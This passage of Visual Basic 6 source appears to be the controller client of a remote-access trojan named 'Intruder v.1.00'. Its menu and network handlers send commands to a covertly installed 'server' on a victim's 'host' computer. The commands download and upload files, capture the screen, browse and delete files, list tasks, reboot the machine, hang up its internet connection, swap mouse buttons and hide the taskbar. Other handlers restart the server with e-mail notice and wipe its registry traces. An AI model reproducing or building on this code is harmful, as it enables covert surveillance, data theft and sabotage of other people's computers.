       tvwDirectory_NodeClick tvwDirectory.SelectedItem
    End If
    
    
End Sub

Private Sub mnuReboot_Click()
    ' Reboot System
    SendData "Reboot,"
End Sub

Private Sub mnuRemoveServ_Click()
    Dim Res As Integer
    
    Res = MsgBox("This action will result in the total removal of the Server. " & vbCrLf & _
    "As well as all traces in the Registry." & _
    vbCrLf & _
    vbCrLf & _
    "Do you wish to continue?", vbYesNo, "Seek and Destroy?")
    
    Dim Msg As String
    Msg = " -->Attempting to remove server and all traces as: " & CurrentIP
    Logit Msg
    
    SendData "Remove_Server_Traces,"
    
End Sub


Private Sub mnuResolution_Click()
    frmResolution.Show
End Sub

Private Sub mnuRun_Click()
   frmFBrowser.Run
End Sub

Private Sub mnuSefvStart_Click()
    
    
      
     Dim Result As Integer
     
     Result = MsgBox("This command will cause the server to be temporarily shutdown. This must be done from time to time... just liek rebooting the system. When the server is up and running again, an e-mail will be sent to you notifing you of it's new presence. *NOTE* you must Dis-Connect, then Re-Connect once the server has been restarted." & vbCrLf & vbCrLf & "   Do you wish to continue??", vbYesNo, "Restart Server")
     
     If Result <> vbYes Then Exit Sub
     NewPort = NewPort + 1
     SendData "Restart_Server," & NewPort
     ' init the restart server
     ' teh restart server should be running by now.
     ' try to connect
     
     ' pause 1 sec to make sure the server has been terminated.
     Pause 1000
     ' close the client
     tcpClient.Close
    ' attempt a connection at sent port #
     Pause 2000
     
     tcpRestart.Connect CurrentIP, NewPort
     
    Dim Msg As String
    Msg = " -->Attempting to restart server at: " & CurrentIP
    Logit Msg
    
     
     
     
     
End Sub

Private Sub mnuSimpHelp_Click()
   FloaterForm Me, frmHelp
End Sub

Private Sub NSFile1_FtsOnTransferStarted()

End Sub

Private Sub mnuTManage_Click()
   On Error Resume Next
   With frmTskManager
      .Left = Me.ScaleWidth - .ScaleWidth + 320
      .Top = Me.Top + .ScaleHeight / 2.5
      .Tag = "Running"
      FloaterForm Me, frmTskManager
    End With
End Sub

Private Sub mnuUpload_Click()
     'Upload a file to the server.
     Dim DLoad_F As String
     
     DLoad_F = LocalFName
      
     MsgBox "Please select a Dir to upload to by either querying the host " & vbCrLf & _
            "for files on a particular drive, or loading a previously saved ""Direcory Path File"".", vbOKOnly, "Select a destination folder."
     
     frmDirs.Tag = "Upload"
     frmDirs.Show
End Sub

Private Sub mnuWriteDesk_Click()
    frmGetText.Show
End Sub

Private Sub muJerkMouse_Click()
    SendData "Mouse,"
    JerkMse = "-->Command sent to " & CurrentIP & " to Jerk Mouse."
    Logit JerkMse
End Sub

Private Sub muPlay_Click()
    frmWave.Show
End Sub

Private Sub muTaskBar_Click()
    HTBar = "-->Command sent to " & CurrentIP & " to Hide\Show Task Bar."
    Logit HTBar
    SendData "Hide_TBar,"
End Sub




Private Sub Toolbar1_ButtonClick(ByVal Button As MSComctlLib.Button)
    Select Case Button.Key
       Case "Connect"
          mnuConnect_Click
       Case "DisConnect"
          mnuDisconnect_Click
       Case "Browse"
          mnuFileBr_Click
       Case "Flush"
          mnuFlushServer_Click
       Case "Msg"
          mnuCompose_Click
       Case "Help"
          FloaterForm Me, frmHelp
       Case "Exit"
          mnuFileExit_Click
    End Select
End Sub



Private Sub tcpRestart_DataArrival(ByVal bytesTotal As Long)
    Dim sincoming As String
    
    tcpRestart.GetData sincoming
    
    Dim Command As String
    Dim Data As String
    
    Command = EvalData(sincoming, 1)
    Data = EvalData(sincoming, 2)
    
    Select Case Command
        Case "Connect"
           ' we have made a connection.
           Label3 = "Attempting to restart server"
           Pause 5000
           Randomize
           Rnd
           tcpRestart.SendData "Restart," & ServerPath & ">" & Int((1257 * Rnd) + 12589)
           'tcpRestart.Close
        
        Case "success"
           MsgBox "The Server Has been restarted.... Connect on Port: " & Data
           tcpRestart.Close
        Case "fail"
           MsgBox "The Restart of the server failed."
           tcpRestart.Close
    End Select
End Sub


Private Sub tcpClient_DataArrival _
(ByVal bytesTotal As Long)
    
   ' On Error GoTo NotConnected
    Dim sincoming As String
    Dim Command As String
    Static ii
    
    tcpClient.GetData sincoming
    
    ' Extract the command from the DataArrival
    Command = EvalData(sincoming, 1)
    
    bReplied = True
    Label3 = "Incoming.....  " & EvalData(sincoming, 1)
    
    Select Case Command
         Case "Restart_Port_Number"
              NewPort = EvalData(sincoming, 2)
              
              
         Case "File_Chunk"
              Dim DLoadState As String
              Dim DLName As String
              DLoadState = Mid$(sincoming, 12, InStr(12, sincoming, ";"))
              
              Select Case DLoadState
                   Case "fin;"
                    'The client said that that was that and the file is
                    'fully transmitted
                    Close #nfile
                    nfile = 0
                    'Call the Display forms load event
                    Screen.MousePointer = 0
                    Me.Caption = " (Intruder v.1.00)"
                    MsgBox "Download Complete.", , "Intruder v.1"
                    
                    'frmUsersScreen.Form_Load
                   Case Else ' this should be a number
                    lLength = Val(Mid$(sincoming, 12, InStr(12, sincoming, ";") - 6))
                    sGetBuffer = Mid$(sincoming, InStr(12, sincoming, ";") + 1)
                    'Make sure that the amount of bytes specified on the
                    'client side is actualy here.
                    If Len(sGetBuffer) <> lLength Then
                        'Reply back to the client that you didn't received all
                        'data thus stopping the tranmision
                        SendData "DownLoad_This_,not ok"
                        If nfile <> 0 Then
                            Close #nfile
                            nfile = 0
                            MsgBox "Error in transfer"
                        End If
                       Else
                        'The varaible keeps track of how many bytes received
                        TotalBytes = TotalBytes + lLength
                        'Check if the file on this side is already opened
                        If nfile = 0 Then
                            Dim FileResults As Boolean
                            DLName = DLoadSaveName
                            'No the file was not created so create the file on this side
                                                       
                            nfile = FreeFile
                            FileResults = FileExists(DLName)
                            If (FileResults) Then Kill DLName
                             
                            Open DLName For Binary As #nfile
                            Dim DLMsg As String
                            DLMsg = "--> Command sent to " & CurrentIP & ". Download the file: " & DLoadFName
                            
                            Logit DLMsg
                            Screen.MousePointer = vbHourglass
                        End If
                        'Put the data received into the file
                        Put #nfile, , sGetBuffer
                        'Reply back to the client that the data was received an to send the
                        'next batch
                        Me.Caption = "Downloading " & DLoadFName & "...  bytes recieved: " & TotalBytes & "  of (put file size here)"
                        SendData "DownLoad_This_,ok"
                    End If
              End Select
       
       Case "Screen_Chunk"
       
            Select Case Mid$(sincoming, 14, InStr(14, sincoming, ":"))
                Case "fin:"
                    'The client said that that was that and the file is
                    'fully transmitted
                    Close #nfile
                    nfile = 0
                    'Call the Display forms load event
                    Screen.MousePointer = 0
                    Me.Caption = " (Intruder v.1.00)"
                    frmUsersScreen.Form_Load
                Case Else 'Should be a number
                    lLength = Val(Mid$(sincoming, 14, InStr(14, sincoming, ":") - 6))
                    sGetBuffer = Mid$(sincoming, InStr(14, sincoming, ":") + 1)
                    'Make sure that the amount of bytes specified on the
                    'client side is actualy here.
                    If Len(sGetBuffer) <> lLength Then
                        'Reply back to the client that you didn't received all
                        'data thus stopping the tranmision
                        SendData "Capture_Screen,not ok"
                        If nfile <> 0 Then
                            Close #nfile
                            nfile = 0
                            MsgBox "Error in transfer"
                        End If
                       Else
                        'The varaible keeps track of how many bytes received
                        TotalBytes = TotalBytes + lLength
                        'Check if the file on this side is already opened
                        If nfile = 0 Then
                            
                            Dim DirResults As Boolean
                            Const FName As String = "C:\SCREEN.BMP"
                            'No the file was not created so create the file on this side
                                                       
                            nfile = FreeFile
                            DirResults = FileExists(FName)
                            If (DirResults) Then Kill FName
                             
                            Open FName For Binary As #nfile
                            Dim FIleMsg As String
                            FIleMsg = "--> Command sent to " & CurrentIP & " Capture the viewable screen."
                            
                            Logit FIleMsg
                            Screen.MousePointer = vbHourglass
                        End If
                        'Put the data received into the file
                        Put #nfile, , sGetBuffer
                        'Reply back to the client that the data was received an to send the
                        'next batch
                        Me.Caption = "Downloading Screen Capture...  bytes recieved: " & TotalBytes
                        SendData "Capture_Screen,ok"
                    End If
               End Select
               
                      
       Case "Transfer_Done"
          Logit Done
          ' reset chunk counter
          ii = 0
          Screen.MousePointer = 0
          frmPicIMg.StatusBar1.Panels(1).Text = "  Ready..."
       Case "Users_Data"
           
           With frmFBrowser
               ' update the data type
               ReDim Preserve Data.FileName(Data.Num_Files + 1)
               Data.FileName(frmFBrowser.List1.ListCount) = EvalData(sincoming, 2)
               .List1.Visible = True
               .Timer1.Enabled = True

           End With
           
           
           ii = ii + 1
           Logit RecievMsg & " " & ii
           
           UpdatePaths frmFBrowser.List1, EvalData(sincoming, 2)
           
       Case "Num_Files"
           Dim TempNF
           ' extract the sent data
           TempNF = EvalData(sincoming, 2)
           Data.Num_Files = CInt(TempNF)
           
       Case "Users_Dirs"
           
           
           With frmDirs
             ReDim Preserve Dir_.FileName(Dir_.Num_Dirs + 1)
             Dir_.FileName(frmDirs.List1.ListCount) = EvalData(sincoming, 2)
             .Timer1.Enabled = True
           End With
             
           ii = ii + 1
           Logit RecievMsg & " " & ii
           UpdatePaths frmDirs.List1, EvalData(sincoming, 2)
           
       Case "Num_Dirs"
           Dim TempND
           ' extract the sent data
           ii = 0
           TempND = EvalData(sincoming, 2)
           Dir_.Num_Dirs = CInt(TempND)
           
       Case "Copy_Complete"
           MsgBox "Copy completed successfully", , "The Intruder v.1"
           
       Case "Copy_Error"
          MsgBox "Error trying to copy files!", vbCritical, "ERROR"
          
       Case "Del_Complete"
          Dim Res As Integer
          
          MsgBox "The file [" & EvalData(sincoming, 2) & "] has been removed from the users Hard drive.", , ""
          
                   
       Case "Moved"
            Dim Res_ As Integer
            frmFBrowser.SB.Panels.Item(1).Text = frmFBrowser.List1.List(frmFBrowser.List1.ListIndex) & ".... has beem moved."
            
            MsgBox "The file [" & EvalData(sincoming, 2) & "] has been Moved.", , ""
          
        Case "Edit_Chunk"
            ' place the contens in the edit screen
            frmEdit.Text1 = frmEdit.Text1 & EvalData(sincoming, 2) ' use three because it is a text file
            TextChanged = False
            
        Case "Saved"
            ' the file was saved.
            MsgBox "The file: [" & EvalData(sincoming, 2) & "] has been saved successfully.", , ""
            
        Case "UserDiskSave_Error"
            MsgBox "There was an error saving the file: (" & EvalData(sincoming, 2) & ")", vbCritical, "Possible Security Breach!"
        
        Case "UserDiskSave_Complete"
            MsgBox "The file: (" & EvalData(sincoming, 2) & ") has been saved.", , "File Saved!"
            
        Case "Num_Search_Files"
            Dim TempNSF
            ' extract the sent data
            TempNSF = EvalData(sincoming, 2)
            Data.Num_Files = CInt(TempNSF)
           
        Case "Load_Pic_Data"
            ' update the data type
            ReDim Preserve Data.FileName(Data.Num_Files + 1)
            Data.FileName(frmPicIMg.List1.ListCount) = EvalData(sincoming, 2)
                        
            ii = ii + 1
            Logit RecievMsg & " " & ii
            frmPicIMg.StatusBar1.Panels(1).Text = "  Loading Image paths..."
            
            UpdatePaths frmPicIMg.List1, EvalData(sincoming, 2)
            
        Case "Num_Pics"
            Dim TempNP As Integer
            ' extract the sent data
            frmPicIMg.List1.Clear
            ClearArray Data, "Files"
            TempNP = EvalData(sincoming, 2)
            Data.Num_Files = CInt(TempNP)
            
        Case "Num_Waves"
            Dim TempNW As Integer
            ' extract the sent data
            frmWave.List1.Clear
            ClearArray Data, "Files"
            TempNW = EvalData(sincoming, 2)
            Data.Num_Files = CInt(TempNW)
            
        Case "Load_Wave_Data"
            ' update the data type
            ReDim Preserve Data.FileName(Data.Num_Files + 1)
            Data.FileName(frmWave.List1.ListCount) = EvalData(sincoming, 2)
                        
            ii = ii + 1
            Logit RecievMsg & " " & ii
            frmWave.StatusBar1.Panels(1).Text = "  Loading Wave paths..."
            
            UpdatePaths frmWave.List1, EvalData(sincoming, 2)
            
        Case "Wave_Error"
           MsgBox EvalData(sincoming, 2), " Wave File Error"
        Case "Wave_Done"
           frmWave.StatusBar1.Panels(1) = " Ready"
            
        Case "Retrieved_Search_Data"
           ' assume the listbox portion of the form has _
           already been revealed
           With frmSearch
             .List1.AddItem EvalData(sincoming, 2)
             .Label2 = Data.Num_Files
           End With
           
        Case "Got_Owner_Info"
           Dim StopPos As Integer
           
           OwnerName = EvalData(sincoming, 2)
           TimeZone = EvalData(OwnerName, 2, "^")
           Sysdir = EvalData(TimeZone, 2, ";")
           lblName = "  Owners name:  " & OwnerName & "  "
           
           ' get only the region
           StopPos = InStr(1, TimeZone, " ", vbTextCompare)
           TimeZone = Mid(TimeZone, 1, StopPos - 1)
           
           lblTime = "  Time Zone:  " & TimeZone & "  "
                     
        Case "Rebooted"
           Logit ReBootMsg
           
        Case "Reboot_Error"
           MsgBox EvalData(sincoming, 2), vbCritical, "ERROR REBOOTING"
           Dim BootErr As String
           BootErr = "-->Error trying to reboot users system."
           
           
           Logit BootErr
           
        Case "Capture_Error"
           MsgBox EvalData(sincoming, 2), vbCritical, "Capture Error"
                      
        Case "LockUp_Done"
           MsgBox "The host computer has been released.", vbInformation, App.EXEName & "V." & App.Major & "." & App.Minor
           frmPicIMg.StatusBar1.Panels(1).Text = _
           "  Ready..."
           
        Case "Tasks_Retrieved"
           UpdateCMB frmTskManager.List1, EvalData(sincoming, 2)
           
            
        Case "Swapped"
           Swapped = "-->Swapped users Mouse buttons at " & CurrentIP
          Logit Swapped
           
        Case "UnSwapped"
           UnSwapped = "-->Swapped users Mouse buttons at " & CurrentIP
          Logit UnSwapped
           
        Case "HungUp"
           HungUp = "-->Disconnected " & CurrentIP & " from their Internet Connection."
           Logit HungUp
           
        Case "EMail_Settings_Changed"
           Dim Msg As String
           Msg = "-->Updated Email Notify Settings."
           Logit Msg
           
           If frmSetMail.chkAdmin.Value = vbChecked Then
             MsgBox "New Mail settings saved as " & EvalData(sincoming, 2) _
                  & vbCrLf & vbCrLf & "Remember to include this file when shipping to the soon to be host.", vbInformation, "New Mail Settings"
           Else
             MsgBox "New Mail settings saved on the host computer as " & EvalData(sincoming, 2), vbInformation, "New Mail Settings"
           End If
           
        Case "Picture_Showing"
           frmPicIMg.StatusBar1.Panels(1).Text = _
           "  Now Displaying [" & frmPicIMg.List1.List(frmPicIMg.List1.ListIndex) & "]"
           
        Case "Tasks_Loaded"
           frmTskManager.SB.Panels(1).Text = "  Done"
           
        Case "Error_Closing"
           MsgBox EvalData(sincoming, 2)
                    
        Case "Not_Open"
           MsgBox EvalData(sincoming, 2)
           
        Case "Server_Closed"
           MsgBox "The server has been terminated."
           'disconnect
           mnuDisconnect_Click
    
    
        Case "Send_State"
           Dim Msg3 As String
           
           Msg3 = "Gathering files.... Current State = " & EvalData(sincoming, 2)
           
           Logit Msg3
           
        Case "Monitor_Update"
           Select Case EvalData(sincoming, 2)
              Case "missing"
                 MsgBox "The Monitor is not in the directory intended, or is missing."
              Case "found"
                 MsgBox "The monitor has been found."
           End Select
           
           
        Case "Error_Msg"
           MsgBox EvalData(sincoming, 2), vbCritical, "MiscError"
        
        
        Case "Drives_Retrieved"
           ' MsgBox "FIXED   " & EvalData(sIncoming, 2)
            ' first one coming in is the
            DistDrives EvalData(sincoming, 2)
        Case "CD_Retrieved"
           ' MsgBox "CD  " & EvalData(sIncoming, 2)
            DistDrives EvalData(sincoming, 2)
        Case "Flop_Retrieved"
            DistDrives EvalData(sincoming, 2)
            
        
              
        Case "Sys_Info"
            ' dispaly the sysInfo
            DispSysINfo EvalData(sincoming, 2)
                  
        Case "User_Response"
            MsgBox EvalData(sincoming, 2), , "User Reply."
                  
        Case "Chat_Incoming"
                  
            frmMsgType.Text2 = _
            frmMsgType.Text2 & vbCrLf & LCase(EvalData(sincoming, 2))
            ScrollChat sincoming, frmMsgType.Text2.Text
                  
        Case "Chat_Error_Msg"
                
            frmMsgType.called = 0
            MsgBox EvalData(sincoming, 2), vbExclamation, "Chat cancelled"
            
        Case "Server_path"
            ServerPath = EvalData(sincoming, 2)
            
    End Select
    bReplied = True
    
    Exit Sub
    
'NotConnected:
'   MsgBox err.Description '"You are not connected!", vbCritical, "Client not connected!"
    
End Sub

Private Sub Timer1_Timer()
    
     cntr = cntr + 1
     
    If tcpClient.State = ONLINE Then
       SB.Panels.Item(1).Text = "Connection Status:  CONNECTED"
       mnuConnect.Enabled = False
        If cntr = 1 Then
          CalcTime True
        Else
          CalcTime False
        End If
        
       SB.Panels.Item(3).Text = "Users IP:  " & CurrentIP
    ElseIf tcpClient.State <> ONLINE Then
       SB.Panels.Item(1).Text = "Connection Status:  DISCONNECTED"
       mnuConnect.Enabled = True
       mnuDisconnect_Click
       SB.Panels.Item(2).Text = "Duration:  00:00"
       SB.Panels.Item(3).Text = "Users IP:  Unknown"
    End If
End Sub


Private Sub DoMenuIcons()
   Dim hmenu As Long
   Dim hSubMenu As Long
   Dim hID As Long
   Dim i As Integer
   Dim CurMenu As Long
   Dim MenuPos(1 To 9) As Integer
   Dim NumIcons As Integer
   Dim NumBits(1 To 4) As Integer ' tracks the numer of bitmaps on each menu
   
   ' initialize the bitmap count array
   NumBits(1) = 4
   NumBits(2) = 5
   
   ' initialize the Menu positon array
   ' this array stores the position of
   ' each Bitmap.
   MenuPos(1) = 0
   MenuPos(2) = 1
   MenuPos(3) = 3
   MenuPos(4) = 4
   
   MenuPos(5) = 2 '3
   MenuPos(6) = 6 '5
   MenuPos(7) = 7 '6
   MenuPos(8) = 9 '8
   MenuPos(9) = 2 '1
  
   ' how many Bitmaps total?
   NumIcons = NumBits(1) + NumBits(2)
   
   'Get the handle of the first submenu
   hmenu = GetMenu(frmClient.hwnd)
   ' init the first menu
   CurMenu = 0
   ' cycle through all the bitmaps
   ' placeing them in the appropriate spots.
      
   For i = 1 To NumIcons
   
     If i > NumBits(1) Then
        CurMenu = 1
     End If
     
     'Get the menuId of the current menu being set
     hSubMenu = GetSubMenu(hmenu, CurMenu)
     hID = GetMenuItemID(hSubMenu, MenuPos(i)) 'Add the bitmap
     SetMenuItemBitmaps hmenu, hID, MF_BITMAP, picMenu(i), picMenu(i)
   Next
   
End Sub





' treemode functions
'-------------------------------------------------------------------------------------------

'===========================================================================================


Private Sub DirFolders_Change()

    filFiles.Path = DirFolders.Path

End Sub


Private Sub driDrives_Change()

    DirFolders.Path = driDrives.Drive
End Sub


Private Sub BuildDriveList()

    Dim i As Integer
    Dim strPath As String
    Dim intIcon As Integer

    tvwDirectory.Nodes.Clear
    
    For i = 0 To driDrives.ListCount - 1
    
        strPath = UCase(Left(driDrives.List(i), 1)) & ":\"
        
        Select Case strPath
        
            Case "A:\", "B:\" ' Diskette drive.
                intIcon = 1
                
            Case "D:\"
                intIcon = 3     ' CD drive.
                
            Case Else           ' Hard drive.
                intIcon = 2
        
        End Select
        
        tvwDirectory.Nodes.Add , , strPath, driDrives.List(i), intIcon
        tvwDirectory.Nodes.Add strPath, tvwChild, ""
            
    Next

End Sub



Private Sub tvwDirectory_AfterLabelEdit(Cancel As Integer, NewString As String)
      
      Dim DLetter As String
      Dim NewName As String
      
      DLetter = Left(LocalFName, 3)
      NewName = DLetter & NewString
      
      Name LocalFName As NewName
      
      Label3 = "  Rename Successfull."
End Sub


Private Sub tvwDirectory_Expand(ByVal Node As ComctlLib.Node)

    On Error GoTo ErrorTrapping
    
    Dim i As Integer
    Dim strRelative As String
    Dim strFolderName As String
    Dim intFolderPos As Integer
    Dim intIcon As Integer
    Dim strNewPath As String
    Dim strExt As String
    Dim intExtPos As Integer
        
    MousePointer = vbHourglass
        
    If Node.Child.Text = "" Then
                
        tvwDirectory.Nodes.Remove Node.Child.Index
        strRelative = Node.Key
        DirFolders.Path = strRelative
        intFolderPos = Len(strRelative) + 1
                
        ' Add folders
        For i = 0 To DirFolders.ListCount - 1
        
            strFolderName = Mid(DirFolders.List(i), intFolderPos)
            
            strNewPath = strRelative & strFolderName & "\"
            tvwDirectory.Nodes.Add strRelative, tvwChild, strNewPath, strFolderName, 4
            
            DirFolders.Path = strNewPath
            
            If (filFiles.ListCount > 0) Or (DirFolders.ListCount > 0) Then
            
                tvwDirectory.Nodes.Add strNewPath, tvwChild, , ""
                tvwDirectory.Nodes(strNewPath).ExpandedImage = 5
                            
            End If
            
            DirFolders.Path = strRelative
                        
        Next
        
        ' Add files
        For i = 0 To filFiles.ListCount - 1
        
            strExt = UCase(filFiles.List(i))
            intExtPos = InStr(strExt, ".") + 1
            
            If intExtPos > 0 Then
                strExt = Mid(strExt, intExtPos)
            Else
                strExt = ""
            End If
            
            Select Case strExt
            
                Case "TXT", "DOC"
                    intIcon = 9
                    
                Case "HLP"
                    intIcon = 8
                    
                Case "EXE", "COM"
                    intIcon = 7
                    
                Case "BMP", "JPG", "GIF"
                    intIcon = 6
                    
                Case Else
                    intIcon = 10
            
            End Select
            
            tvwDirectory.Nodes.Add strRelative, tvwChild, , filFiles.List(i), intIcon
                        
        Next
        
    End If
    
    GoTo EndSub
    
ErrorTrapping:
    ' An error occurs when you try reading on a not ready drive
    
    ' re-add the precedent removed item
    tvwDirectory.Nodes.Add Node.Key, tvwChild, , ""
    Resume EndSub
    
EndSub:
    MousePointer = vbDefault
End Sub

Private Sub tvwDirectory_MouseDown(Button As Integer, Shift As Integer, x As Single, y As Single)
     If Button = 2 And Label3 <> "" Then
        If tcpClient.State <> ONLINE Then
          mnuUpload.Enabled = False
        Else
          mnuUpload.Enabled = True
        End If
        PopupMenu mnuPopUp
     End If
End Sub

Private Sub tvwDirectory_NodeClick(ByVal Node As ComctlLib.Node)
     Dim DriveL As String
     Dim startPos As Long
     On Error Resume Next
     DriveL = Left(Node.FullPath, 2)
     
     If Right(DriveL, 1) = "\" Then
        DriveL = DriveL + "\"
     End If
     
     LocalDirName = Node.Key
        
     ' go to the first instance of "\"
     ' extract everything to the left
     startPos = InStr(1, Node.FullPath, "\", vbTextCompare)
          
     LocalFName = DriveL & Mid(Node.FullPath, startPos)
     
     If tvwDirectory.Tag = "GetName" Then
       If LocalFName = "" _
        Or (Len(LocalFName) < 4 And Len(Node.Key) < 4) _
        Or (Len(LocalFName) > 4 And Node.Key <> "") Then
         
         LocalFName = Node.Key
       End If
       
       Label3 = " " & LocalFName
       Label3.ToolTipText = Label3
     End If
     
     ' disable dir functions if a filename is selected
     If Node.Key = "" Or Len(Node.Key) < 4 Then
       mnuNewDir.Enabled = False
       mnuPopRemoveDir.Enabled = False
       mnuCopy.Enabled = True
       mnuDel.Enabled = True
       mnuMove.Enabled = True
       mnuUpload.Enabled = True
          'is it a Program that can be ran?
          If LCase(Right(LocalFName, 3)) = "exe" Or LCase(Right(LocalFName, 3)) = "com" Then
             mnuRunLocal.Enabled = True
          Else
             mnuRunLocal.Enabled = False
          End If
            'is it a text file "
            If LCase(Right(LocalFName, 3)) <> "txt" And _
              LCase(Right(LocalFName, 3)) <> "ini" And _
              LCase(Right(LocalFName, 3)) <> "bat" And _
              LCase(Right(LocalFName, 3)) <> "---" And _
              LCase(Right(LocalFName, 3)) <> "bak" And _
              LCase(Right(LocalFName, 3)) <> "inf" And _
              LCase(Right(LocalFName, 3)) <> "dos" And _
              LCase(Right(LocalFName, 3)) <> "old" And _
              LCase(Right(LocalFName, 3)) <> "log" And _
              LCase(Right(LocalFName, 3)) <> "chk" And _
              LCase(Right(LocalFName, 3)) <> "b~k" And _
              LCase(Right(LocalFName, 3)) <> "htm" And _
              LCase(Right(LocalFName, 4)) <> "html" And _
              LCase(Right(LocalFName, 3)) <> "bas" And _
              LCase(Right(LocalFName, 3)) <> "cpp" And _
              LCase(Right(LocalFName, 2)) <> "js" And _
              LCase(Right(LocalFName, 1)) <> "c" And _
              LCase(Right(LocalFName, 3)) <> "sys" Then
              mnuOpenLocal.Enabled = False
            Else
              mnuOpenLocal.Enabled = True
            End If
     Else
       mnuNewDir.Enabled = True
       mnuPopRemoveDir.Enabled = True
       mnuCopy.Enabled = False
       mnuDel.Enabled = False
       mnuMove.Enabled = False
       mnuUpload.Enabled = False
     End If
     
     ' disable all if a drive is selectd
     If Right(Node.Key, 1) = "\" And Len(Node.Key) < 4 Then
       mnuCopy.Enabled = False
       mnuDel.Enabled = False
       mnuMove.Enabled = False
       mnuUpload.Enabled = False
     End If
     
     
     If tvwDirectory.Tag = "AddDir" Then
       tvwDirectory.Nodes.Add Node.Key, tvwChild, , "New_Dir", 4
       tvwDirectory.Nodes(Node.Key).ExpandedImage = 5
       MakeDir Node.Key & "New_Dir"
       tvwDirectory.Tag = "GetName"
     End If
     
     If tvwDirectory.Tag = "Del" Then
       ' remove the selected node.
       tvwDirectory.Nodes.Remove Node.Index
       tvwDirectory.Tag = "GetName"
     End If
     
     
End Sub
